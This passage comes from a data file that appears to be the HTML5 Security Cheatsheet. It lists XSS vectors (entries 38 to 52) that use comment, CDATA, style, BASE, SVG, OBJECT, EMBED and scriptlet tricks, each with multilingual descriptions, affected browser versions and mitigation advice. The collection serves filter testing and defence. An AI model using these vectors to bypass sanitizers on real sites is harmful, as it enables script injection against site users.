            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['3.0', '4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'javascript', 'comment', 'parsing', 'attributes'],
        'reporter'   : 'sirdarckcat, .mario'
    },
    { /* ID 38 - HTML comment parsing issues (2)  */
        'id'         : 38,
        'category'   : 'html', 
        'name'       : {
            'en' : 'HTML comment parsing issues (2)',
            'ja' : '',
            'ru' : 'Разбор комментариев в HTML (2)',
            'cs' : 'Problém s parsováním HTML komentářů (2)',
            'de' : ''
        },
        'data'       : '<comment><img src="</comment><img src=x onerror=%js_alert%//">',
        'description': {
            'en' : 'Besides <!---> the Internet Explorer allows to use <COMMENT> tags. The vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments. This example works up to IE 8 standards mode.',
            'ja' : '',
            'ru' : 'Вместо <!---> Internet Explorer разрешает использовать тег <COMMENT>. Этот пример также показывает, как разбираются комментарии, и какие проблемы могут возникнуть в случае, если пользовательская разметка может их содержать. Пример будет работать вплоть до режима стандартов IE 8.',
            'cs' : 'Kromě <!---> umožňuje IE zapsat komentáře i do tagu <comment>. Výše zmíněný příklad dělá totéž do příklad 1',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure <COMMENT> tags are not allowed in user submitted html. The markup should be checked for security issues after <COMMENT> tags have been stripped out or escaped - not before. ',
            'ja' : '',
            'ru' : 'Убедитесь, что тег <COMMENT> не разрешен в пользовательской разметке. Разметка должна проверяться для целей безопасности только после удаления тегов <COMMENT>.',
            'cs' : 'Vyhoďte <COMMENT> z vloženého kódu a kontrolujte nebezpečnost vždy až po tomto vyhození, ne před ním.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0']
        },
        'tags'       : ['xss', 'javascript', 'comment', 'parsing', 'attributes'],
        'reporter'   : '.mario'
    },
    { /* ID 39 - CDATA section parsing issues  */
        'id'         : 39,
        'category'   : 'html', 
        'name'       : {
            'en' : 'CDATA section parsing issues',
            'ja' : '',
            'ru' : 'Разбор CDATA-секций',
            'cs' : 'Problém s parsováním CDATA',
            'de' : ''
        },
        'data'       : '<!-- up to Opera 11.52, FF 3.6.28 -->\r\n<![><img src="]><img src=x onerror=%js_alert%//">\r\n\r\n<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\r\n<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=%js_alert_2%//"></svg>',
        'description': {
            'en' : 'Firefox and Opera allow using CDATA section delimiters in HTML - in the stripped form "<![" as well as including padding like "<![CDATA[". This can cause problems for filter mechanisms since those delimiters can be used for massive obfuscation. Firefox 4 and Opera 11.60 have fixed the issue. However, modern browsers have a separate XML parsers for inline SVG or MathML, which allow to use the CDATA sections (including a little irregular shape).',
            'ja' : '',
            'ru' : 'Firefox и Opera разрешают использовать разделители CDATA-секций в HTML. В сокращенной форме "<![" то же самое, что и "<![CDATA[". Это может породить проблемы для механизма фильтрации, поскольку эти разделители могут быть использованы для обфускации. Это свойство было исправлено в Firefox 4 и Opera 11.60. Тем не менее, современные браузеры имеют отдельные XML-парсеры для встроенного SVG или MathML, которые позволяют использовать CDATA-секции (в том числе в немного неправильной форме).',
            'cs' : 'Firefox a Opera umožňují oddělovače sekce CDATA v HTML - ve zkrácené formě "<![" stejně jako v té plné "<![CDATA[" Může to způsobit řadu problémů u filtrů, pokud budou použityt jako masivní obfuskace.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure CDATA delimiters are not allowed in user submitted html. The markup should be checked for security issues after CDATA sections nd delimiters have been stripped out or escaped - not before.',
            'ja' : '',
            'ru' : 'Убедитесь, что CDATA-разделители не разрешены в пользовательской разметке. Разметка должна проверяться для целей безопасности только после удаления CDATA-секций.',
            'cs' : 'Zakažte CDATA delimitery a kontrolujte vstup až po odstranění těchto delimiterů',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.0', '9.0', '10.0', '11.0', '12.0', 'mobile'], 
            'firefox' : ['1.x', '2.0', '3.0', '4.0', '15.0'],
            'internet explorer': ['9.0', '10.0'],
            'chrome': ['7.0', '23.0'],
            'safari': ['4.0.4', '5.1.7']
        },
        'tags'       : ['xss', 'javascript', 'cdata', 'parsing', 'attributes', 'math', 'svg', 'inline'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 40 - Plaintext tags used for markup obfuscation  */
        'id'         : 40,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Plaintext tags used for markup obfuscation',
            'ja' : '',
            'ru' : 'Текстовые теги, используемые для обфускации разметки',
            'cs' : 'Zmatení zápisu pomocí tagů v prostých znacích',
            'de' : ''
        },
        'data'       : '<style><img src="</style><img src=x onerror=%js_alert%//">',
        'description': {
            'en' : 'This vector works on all tested user agents and shows how several filtering solutions can be tricked into accepting malicious HTML. A badly written filter will assume the error handler is part of the first image\'s "src" attribute and accept the incoming data.',
            'ja' : '',
            'ru' : 'Этот вектор работает на всех протестированных пользовательких агентах и показывает, как могут быть преодолены некотрые правила фильтрации, запрещающие обработчики событий в качестве атрибутов. Вместо тега <STYLE> может быть использован любой plaintext-тег.',
            'cs' : 'Funguje ve všech prohlížečíc a ukazují, jak snadno lze oklamat špatně napsaný filtr, který považuje obsluhu chyby za regulerní část atributu "src" u prvního img',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Don\'t rely on weak regular express for markup filtering. Use whitelists for allowed tags and rely on a filter solution based on a heavily tested tokenizer/parser.',
            'ja' : '',
            'ru' : 'Не полагайтесь исключительно на регулярные выражения для фильтрации разметки. Используйте белые списки разрешенных тегов и полагайтесь на фильтры, основанные на хорошо тестированных сигнатурах и анализаторах.',
            'cs' : 'Nespoléhejte se při psaní filrtu na prosté regulární výrazy. Použijte whitelist pro dovolené tagy  zkuste filtry, založené na dobře testovaném tokenizeru/parseru',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
            'opera': ['8.x', '9.0', '10.0', '11.0', '12.0', 'mobile'], 
            'firefox' : ['1.x', '2.0', '3.0', '4.0', '15.0'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['3.0', '4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'javascript', 'plaintext', 'tags', 'parsing', 'attributes'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 41 - Error handler via empty list-style and load handler via empty content */
        'id'         : 41,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Error handler via empty list-style and load handler via empty content',
            'ja' : '',
            'ru' : 'Свойства content, list-style как способ автоматического исполнения кода',
            'cs' : 'Událost error při prázdném list-style a událost load při prázdném content',
            'de' : ''
        },
        'data'       : '<li style=list-style:url() onerror=%js_alert%></li>\n<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=%js_alert%></div>',
        'description': {
            'en' : 'Opera 10.5+ and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like background:url() and background-image:url() work as well. Also works combination like content:url(svg), but at the moment it is sensitive to events and <script> tags before and after.',
            'ja' : '',
            'ru' : 'Opera 10.5+ и ниже генерирует событие error для тега <LI> в случае, если URL свойства background не может быть загружен. То же самое действительно для свойства list-style-image. На Opera 10.10 и ниже этот прицип имел универсальный характер, то есть мог быть использован в любом теге. Универсальный характер в Opera 10 и выше имеет комбинация content плюс обработчик onload, однако на данный момент этот способ, хотя и остается работоспособным, однако уже зависит от отсутствия некоторых обработчиков и тегов <script> до и после кода.',
            'cs' : 'Opera 10.5+ a starší verze spustí událost error pro tag <LI> v případě, že není možné pomocí atrinutu stylu načíst background URL. Stejně se chová i "list-style-image". V Opeře 10.10 a starších verzích fungují stejně dobře i jiné kombinace stylů jako například background:url() nebo background-image:url(). Funguje také kompinace jako content:url(svg).',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.0', '9.0', '10.0', '11.0', '12.0', 'mobile'] 
        },
        'tags'       : ['xss', 'javascript', 'css', 'background', 'opera', 'onerror', 'content'],
        'reporter'   : 'LeverOne, .mario'
    },
    { /* ID 42 - Link hijacking via <BASE> and JavaScript URI  */
        'id'         : 42,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Link hijacking via <BASE> and JavaScript URI',
            'ja' : '',
            'ru' : 'Перехват ссылки с помощью тега <BASE> и псевдоскипта',
            'cs' : 'Hijacking odkazu skrz tag <BASE> a JavaScript URI',
            'de' : ''
        },
        'data'       : '<head><base href="javascript://"/></head><body><a href="/. /,%js_alert%//#">XXX</a></body>',
        'trigger'    : 'location.href=document.links[0].href',
        'description': {
            'en' : '<BASE> link hijacking with JavaScript URIs works on Internet Explorer, Opera (O8-10.5 in case the link URL starts with #) and Safari. User interaction is required to execute the JavaScript. The vector sometimes has to be changed slightly to work for all mentioned user agents. Opera 11 ships a more or less working fix, but this problem continues to exist in difficult to exploit forms though.',
            'ja' : '',
            'ru' : 'Этот вектор работает в Internet Explorer, Opera (O8-10.5 в случае, если URL ссылки начинается с #) и Safari. Для выполнения JavaScript необходимо взаимодействие с пользователем. Вектор иногда приходится слегка изменять для работоспособности во всех заявленных браузерах. В O11 условно исправлена данная проблема, однако остаются еще трудноэксплуатируемые варианты данного вектора, не имеющие практического значения.',
            'cs' : 'Hijacking odkazu v tagu <BASE> s JavaScriptovými URI pracuje v Internet Exploreru, Opeře (O8-10.5 v případě, že URL odkazu začíná na #) a v Safari. Ke spuštění kódu je vyžadována spoluúčast uživatele. Navíc je pro správnou funkci v jednotlivých prohlížečích potřeba použít mírně upravený zápis.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'User submitted HTML should not allow usage of <BASE> tags. In case they are necessary no non-HTTP/non-relative URL schemes should be allowed.',
            'ja' : '',
            'ru' : 'Пользовательская разметка не должна содержать тег <BASE>. Если это возможно, должны быть запрещены все URL, не являющиеся относительными или не начинающиеся с "http://".',
            'cs' : 'HTML vkládané uživatelem by nemělo mít povoleno použití tagu <BASE>. V případě, že je jeho použití nezbytně nutné, měla by se zkontrolovat hodnota odkazu, která by měla být buďto relativní nebo by měla začínat na http://',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.x', '9.0', '10.0', '10.63', 'end'],
            'safari': ['3.0', '4.0', '5.0', '5.1.7'],
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', 'end'] 
        },
        'tags'       : ['xss', 'javascript', 'opera', 'internet explorer', 'base', 'hijacking'],
        'reporter'   : 'brainpillow, Gareth, .mario'
    },
    { /* ID 43 - Opera 10 SVG font XSS  */
        'id'         : 43,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'Opera 10 SVG font XSS',
            'ja' : '',
            'ru' : 'XSS через SVG-шрифт в Opera 10',
            'cs' : 'XSS užitím SVG fontů v Opera 10',
            'de' : ''
        },
        'data'       : '<?xml version="1.0" standalone="no"?>\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<style type="text/css">\r\n@font-face {font-family: y; src: url("%svg_font_path%#x") format("svg");} body {font: 100px "y";}\r\n</style>\r\n</head>\r\n<body>Hello</body>\r\n</html>',
        'attachment' : {
            'required_mime' : 'image/svg+xml',
            'crossdomain'    : '0',            
            'path'          : 'http://html5sec.org/font.svg',
            'name'          : 'font.svg',
            'raw'           : '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="%js_alert%" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>'
        },
        'description': {
            'en' : 'Opera 10.00 and later minor versions allow using SVG fonts and will - as soon as the font file has loaded even execute embedded JavaScript. The current example utilizes a load event handler to execute the JavaScript without user interaction as soon as the font file has been fully loaded.',
            'ja' : '',
            'ru' : 'Opera 10.00 и меньшие версии вплоть до 9-й разрешают использовать SVG-шрифты с активным содержимым. При этом, как только будет загружен файл шрифта, автоматически выполнится внедренный в него JavaScript, что и показано в данном примере.',
            'cs' : 'Opera 10.X podporuje použití SVG fontů a umožňuje spustit kód JavaScriptu ve chvíli načtení souboru s fontem. Uvedený příklad spouští vložený kód při zpracování události load po načtení souboru s fontem. ke spuštění kódu není vyžadována uživatelská interakce.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['10.0']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'svg', 'font', 'svgfont'],
        'reporter'   : '.mario'
    },
    { /* ID 44 - Opera @import based XSS inside attribute selectors  */
        'id'         : 44,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Opera @import based XSS inside attribute selectors',
            'ja' : '',
            'ru' : 'XSS с помощью @import внутри атрибута селектора',
            'cs' : 'Opera - XSS založené na @import uvnitř selektorů atributu',
            'de' : ''
        },
        'data'       : '<style>*[{}@import\'%css_path%?]{color: green;}</style>X',
       'trigger'     : 'location=getComputedStyle(document.body, null).OLink.slice(1, -1);',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '1',            
            'path'          : 'http://html5sec.org/test.css',
            'name'          : 'test.css',
            'raw'           : '* {-o-link:\'%js_uri_alert%\';-o-link-source: current;}'
        },
        'description': {
            'en' : 'Opera 10 and later version including latest Opera 10.5 allow breaking out an attribute selector with {} and use @import declarations afterwards. The MIME type for the imported file does not matter - also it can be loaded from arbitrary domains. The imported file contains CSS code to apply a JavaScript URI to all elements on the page to hijack any incoming click.',
            'ja' : '',
            'ru' : 'Opera 10 и более поздние версии, включая Opera 10.5, позволяют прервать атрибут селектора с помощью конструции {} и использовать затем правило @import. MIME-тип и домен импортируемого файла значения не имеют. Данный файл содержит CSS код, перехватывающий нажатие на любом теге для выполнения JavaScript. Смысл закрывающей квадратной скобки состоит в создании видимости целостности атрибута селектора.',
            'cs' : 'Opera 10 a novější verze včetně nejnovější 10.5 umožňují vyskočit ze sektoru atributu použitím {} a následné použití deklarace @import. MIME typ importovaného souboru není rozhodující, stejně jako jeho umístění v libovolné doméně. Importovaný soubor může obsahovat CSS kód, který připojí odkaz na javascript: ke všem prvku na stránce. To může vést ke spuštění skritpu po kliknutí na tyto prvky.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure in user submitted CSS the contents of attribute selectors are properly escaped with backslashes. Also make sure to use a CSS property:value whitelist to forbid properties like -o-link and -o-link-source.',
            'ja' : '',
            'ru' : 'Убедитесь, что в пользовательских стилях содержание атрибута селектора надлежащим образом эскейпируется обратными слешами. Также убедитесь, что используете белый список при работе с CSS, чтобы не допустить такие свойства, как -o-link и -o-link-source.',
            'cs' : 'Ujistěte se, že v uživatelském CSS je obsah atributů vhodně escapován použitím zpětného lomítka. Také překontrolujte použití konstrukcí vlastnost:hodnota vrámci whitelistu a zabraňte použití nebezpečných vlastností, jako jsou -o-link a -o-link-source.',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.0', '9.0', '10.0', '11.0', '11.64', 'end', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'css', 'hijacking', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 45 -  CSS-string breaking  */
        'id'         : 45,
        'category'   : 'css', 
        'name'       : {
            'en' : 'CSS-string breaking',
            'ja' : '',
            'ru' : 'Разрыв CSS-строки',
            'cs' : 'Přerušení textového řetězce v CSS',
            'de' : ''
        },
        'data'       : '<div style="font-family:\'foo[a];color:red;\';">XXX</div>',
        'trigger'    : 'document.getElementsByTagName("div")[0].style.color=="red"?pass():fail();',
        'description': {
            'en' : 'Opera, Firefox and other browsers allow breaking out an css-string with newline symbols. A string cannot directly contain a newline in CSS2+.\n\n[a] Characters*, accepted as CCS-strings breakers:\n\nFirefox, Internet Explorer (IE8+ standards mode), Opera, Google Chrome, Safari: 10,12,13\nOpera 11.01↓, Google Chrome 16↓, Safari: 1-8,11,14-31,127\nOpera 11.01↓: 0\n\n* Characters are given as decimal ASCII table index.',
            'ja' : '',
            'ru' : 'Оpera, Firefox, а также другие браузеры позволяют прервать css-строку с помощью символов новой строки. Строка не может непосредственно содержать символ новой строки согласно стандартам CSS уровня 2 и выше. Фильтры, которые не учитывают эту особенность, будут неправильно определять опасные свойства стилей.\r\n\r\n[a]Далее приведены символы*, воспринимаемые в качестве прерывателей CSS-строк.\n\nFirefox, Internet Explorer (режим стандартов IE8+), Opera, Google Chrome, Safari: 10,12,13\nOpera 11.01↓, Google Chrome 16↓, Safari: 1-8,11,14-31,127\nOpera 11.01↓: 0\n\n* В десятичных кодах.',
            'cs' : 'Opera, Firefox a ostatní webové prohlížeče umožní přerušení textového řetězce v css použitím symbolu pro nový řádek. V CSS2+ nemohou řetězce obsahovat přímo vložený přechod na nový řádek.\n\n[a] Znaky* akceptované pro přerušení řetězců v css:\n\nFirefox, Internet Explorer (IE8+ standards mode), Opera, Google Chrome, Safari: 10,12,13\nOpera 11.01↓, Google Chrome 16↓, Safari: 1-8,11,14-31,127\nOpera 11.01↓: 0\n\n*Uvedeno v desítkové soustavě.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.0', '9.0', '10.0', '11.0', '12.0', 'mobile'],
            'firefox' : ['1.x', '2.0', '3.0', '4.0', '15.0'],
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['3.0', '4.0', '5.0', '5.1.7'],
            'internet explorer': ['8.0', '9.0', '10.0']
        },
        'tags'       : ['trick', 'opera', 'firefox', 'chrome', 'firefox', 'internet explorer', 'css'],
        'reporter'   : 'LeverOne, Michal Zalewski'
    },
    { /* ID 46 - Alternative CSS syntax in Internet Explorer  */
        'id'         : 46,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Alternative CSS syntax in Internet Explorer',
            'ja' : '',
            'ru' : 'Альтернативный css-синтаксис в Internet Explorer',
            'cs' : 'Alternativní syntaxe CSS v Internet Eploreru',
            'de' : ''
        },
        'data'       : '<div style="font-family:foo}color=red;">XXX</div>',
        'trigger'    : 'document.getElementsByTagName("div")[0].style.color=="red"?pass():fail();',
        'description': {
            'en' : 'Internet Explorer allows to use right curly brace (}) as a group separator (up to IE 7 standards mode). A CSS declaration in quirks mode (IE 5 standards mode) may consist of a property name, followed by a symbol of equality (=).',
            'ja' : '',
            'ru' : 'Internet Explorer разрешает использовать правую фигурную скобку (}) в качестве группового разделителя (вплоть до режима стандартов IE7). В режиме совместимости (режим стандартов IE5) css-декларация также может содержать имя свойства, за которым следует знак равенства (=).',
            'cs' : 'Internet Explorer umožňuje použít pravou složenou závorku (}) jako oddělovače skupin. Deklarace CSS se může v quirk režimu skládat z názvu vlastnosti, která je následována znakem rovná se (=).',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'internet explorer', 'css', 'quirks mode', 'proprietary', 'trick'],
        'reporter'   : 'Gareth, LeverOne, sirdarckcat'
    },
    { /* ID 47 - SVG file executing JavaScript via <SCRIPT> tag */
        'id'         : 47,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG file executing JavaScript via <SCRIPT> tag',
            'ja' : '',
            'ru' : 'Исполнение JavaScript в SVG в теге <script>',
            'cs' : 'Spuštění JavaScriptu v SVG užitím tagu <SCRIPT>',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg"><script>%js_alert%</script></svg>',
        'description': {
            'en' : 'SVG files can force the user agent to execute JavaScript via plain <SCRIPT> tags inside any SVG element without user interaction',
            'ja' : '',
            'ru' : 'SVG-файлы могут заключать в себе обычные теги <script>.',
            'cs' : 'SVG soubory mohou spustit kód JavaScriptu obsažený v tagu <SCRIPT> bez interakce uživatele.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbitrary HTML data as well as event handlers in native elements',
            'ja' : '',
            'ru' : 'SVG-файлы не должны рассматриваться в качестве изображений - особенно, когда дело касается загрузки. SVG-файл может содержать произвольные данные HTML, а также обработчики событий в собственных элементах.',
            'cs' : 'SVG soubory by neměly být považovány za obrázky - zvláště v případech kdy přichází přes upload. SVG soubor může obsahovat jakýkoliv HTML kód včetně zracování událostí u nativních prvků.',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['10.x', '11.0', '12.0'],
            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '23.0'],
            'firefox': ['3.x', '4.0', '15.0'],
            'internet explorer': ['9.0'],
            'safari' : ['5.0', '5.1.7']
        },
        'tags'       : ['xss', 'svg', 'script', 'opera', 'firefox', 'chrome', 'internet explorer'],
        'reporter'   : 'Romain'
    },
    { /* ID 48 - JavaScript execution via <SCRIPT> for and event attributes */
        'id'         : 48,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <SCRIPT> for and event attributes',
            'ja' : '',
            'ru' : 'Использование атрибутов for и event в теге <SCRIPT>',
            'cs' : 'Spuštění JavaScriptu tagem <SCRIPT> s atributy FOR a EVENT',
            'de' : ''
        },
        'data'       : '<SCRIPT FOR=document EVENT=onreadystatechange>%js_alert%</SCRIPT>',
        'description': {
            'en' : 'Internet Explorer allow using <SCRIPT> tags with "for" and "event" attributes to bind event data to specific html elements. The two shown attribute values cause script execution without user interaction. Opera simply ignores these attributes.',
            'ja' : '',
            'ru' : 'Internet Explorer поддерживает атрибуты for и event, с помощью которых можно привязать JavaScript-код к событию в конкретном объекте. В приведенном примере эти два атрибута приводят к автоматическому исполнению кода. Опера, в отличии от других браузеров, будет игнорировать эти атрибуты.',
            'cs' : 'Internet Explorer umožňuje použití tagu <SCRIPT> společně s atributy "for" a "event", které naváží obsluhu událostí na specifické HTML elementy. Tyto dva atributy mohou spustit kód bez zásahu uživatele.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['10.0', '11.0', '12.0', 'mobile'],
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', '10.0']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'for', 'event', 'internet explorer'],
        'reporter'   : '.mario'
    },
    { /* ID 49 - JavaScript execution via <OBJECT> DataURL attribute */
        'id'         : 49,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <OBJECT> DataURL attribute',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью параметра DataURL тега <OBJECT>',
            'cs' : 'Spuštění JavaScriptu skrz <OBJECT> s parametrem DataURL',
            'de' : ''
        },
        'data'       : '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="%js_uri_alert%"></OBJECT>',
        'description': {
            'en' : 'Internet Explorer 9 and - in some situations - earlier versions support the use of JavaScript URIs for the "dataurl" attribute of a TDC Object. The JavaScript will be executed without user any interaction.',
            'ja' : '',
            'ru' : 'Internet Explorer 9 и в некоторых случаях меньшие версии поддерживают псевдоскрипт для параметра DataURL тега <OBJECT>, что повлечет исполнение JavaScript без участия пользователя.',
            'cs' : 'Internet Explorer 9 a v některých situacích i starší verze podporují užití direktivy javascript: v URI v atributu "dataurl" TDC objektu. JavaScript se v tomto případě vykoná bez spolupráce uživatele.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms531356%28v=VS.85%29.aspx#Understanding_the_TDC_Object_Model'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'object', 'dataurl', 'TDS'],
        'reporter'   : '.mario'
    },
    { /* ID 50 - JavaScript execution via <OBJECT> data */
        'id'         : 50,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <OBJECT> data',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью атрибута data тега <OBJECT>',
            'cs' : 'Spuštění JavaScriptu použitím atributu DATA tagu <OBJECT>',
            'de' : ''
        },
        'data'       : '<object data="data:text/html;base64,%js_base64_alert%"></object>',
        'description': {
            'en' : 'Almost all browsers supporting data URIs allow executing JavaScript via crafted <OBJECT> "data" attribute value - even if base64 encoded.',
            'ja' : '',
            'ru' : 'Почти все браузеры, поддерживающие протокол data, исполняют JavaScript с помощью атрибута data тега <OBJECT>, который в приведенном примере кодирован в base64.',
            'cs' : 'Většina webových prohlížečů umožňuje spuštění JavaScriptu použitím direktivy javascript: v atributu "data" tagu <OBJECT>. Samotný JavaScript přitom může být zakódován do base64.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure user submitted HTML cannot contain <OBJECT> tags or only whitelisted <OBJECT> "data" values.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательская разметка не содержит тег <OBJECT> , или допускаются только такие параметры атрибута data, которые занесены в белый список.',
            'cs' : 'Ujistěte se, že uživatelem vložené HTML nemá povoleno vkládat tagy <OBJECT>. Pokud přeci jen ano, měly by hodnoty atibutu "data" projít kontrolou proti whitelistu.',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['8.x', '9.0', '10.0', '11.0', '12.0', 'mobile'], 
            'firefox': ['1.x', '2.0', '3.0', '4.0', '15.0'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'chrome', 'embed', 'safari', 'src', 'firefox', 'base64'],
        'reporter'   : '.mario'
    },
    { /* ID 51 - JavaScript execution via <EMBED> src */
        'id'         : 51,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <EMBED> src',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью атрибута src тега <EMBED>',
            'cs' : 'Spuštění JavaScriptu použitím atributu SRC tagu <EMBED>',
            'de' : ''
        },
        'data'       : '<embed src="data:text/html;base64,%js_base64_alert%"></embed>',
        'description': {
            'en' : 'Almost all browsers supporting data URIs allow executing JavaScript via crafted <EMBED> "src" attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.',
            'ja' : '',
            'ru' : 'Почти все браузеры, поддерживающие протокол data, исполняют JavaScript с помощью атрибута src тега <EMBED>, который в приведенном примере кодирован в base64. Только Firefox безуспешно попытается найти плагин-обрабочкик.',
            'cs' : 'Většina webových prohlížečů umožňuje spuštění JavaScriptu použitím direktivy javascript: v atributu "data" tagu <OBJECT>. Samotný JavaScript přitom může být zakódován do base64. Pouze Firefox pokouší se hledat plugin a selže',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure user submitted HTML cannot contain <EMBED> tags or only whitelisted <EMBED> "src" values.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательская разметка не содержит тег <EMBED> , или допускаются только такие параметры атрибута src, которые занесены в белый список.',
            'cs' : 'Ujistěte se, že uživatelem vložené HTML nemá povoleno vkládat tagy <EMBED>. Pokud přeci jen ano, měly by hodnoty atibutu "src" projít kontrolou proti whitelistu.',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['8.x', '9.0', '10.0', '11.0', '12.0', 'mobile'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'chrome', 'embed', 'safari', 'src', 'base64'],
        'reporter'   : '.mario'
    },
    { /* ID 52 - Internet Explorer Scriptlets executing JavaScript */
        'id'         : 52,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Internet Explorer Scriptlets executing JavaScript',
            'ja' : '',
            'ru' : 'Исполнение JavaScript через скриптлеты в Internet Explorer',
            'cs' : 'Spuštění JavaScriptu skrz SCRIPTLET v Internet Exploreru',
            'de' : ''
        },
        'data'       : '<x style="behavior:url(%sct_path%)">',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '0',            
            'path'          : '',
            'name'          : 'test.sct',
            'raw'           : '<SCRIPTLET>\r\n\t<IMPLEMENTS Type="Behavior"></IMPLEMENTS>\r\n\t<SCRIPT Language="javascript">%js_alert%</SCRIPT>\r\n</SCRIPTLET>'
        },        
        'description': {
            'en' : 'Internet Explorer supports Scriptlets as an alternative binding method for Data Islands. By using the shown examples JavaScript will execute without user interaction.',
            'ja' : '',
            'ru' : 'Помимо htc-файлов Internet Explorer поддерживает скриптлеты в качестве альтернативного метода связи с островками XML-данных. При использовании приведенного примера JavaScript будет исполнен без взаимодействия с пользователем.',
